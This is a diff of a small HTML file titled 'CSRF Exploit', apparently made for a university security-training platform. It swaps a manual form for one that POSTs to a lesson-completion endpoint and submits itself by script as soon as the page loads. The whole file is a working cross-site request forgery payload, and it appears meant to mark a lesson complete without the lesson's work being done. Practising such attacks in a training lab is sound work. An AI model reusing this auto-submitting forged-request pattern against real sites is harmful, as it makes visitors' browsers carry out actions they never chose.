@@ -1,10 +1,23 @@
-<!-- csrf-exploit.html -->
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Exploit</title>
+</head>
 <body>
-  <form action="https://snickerboa.it.liu.se/user/csrfchallengeone/plusplus" method="get">
-    <input type="hidden" name="userid" value="8e23a76f34fbf4c17fc122c191bcd99aa4cc178c">
-    <!-- Add other parameters as needed -->
-    <input type="submit" value="Increment CSRF Counter">
-  </form>
+    <h1>Click the button to complete the lesson!</h1>
+    <form id="csrfForm" action="https://snickerboa.it.liu.se/root/grantComplete/unvalidatedredirectlesson?userid=-250752356" method="POST">
+        <!-- You may need to include any necessary parameters here -->
+        <!-- For example, if there are hidden fields expected by the server -->
+        <!-- <input type="hidden" name="param1" value="value1"> -->
+
+        <input type="submit" value="Complete Lesson">
+    </form>
+
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
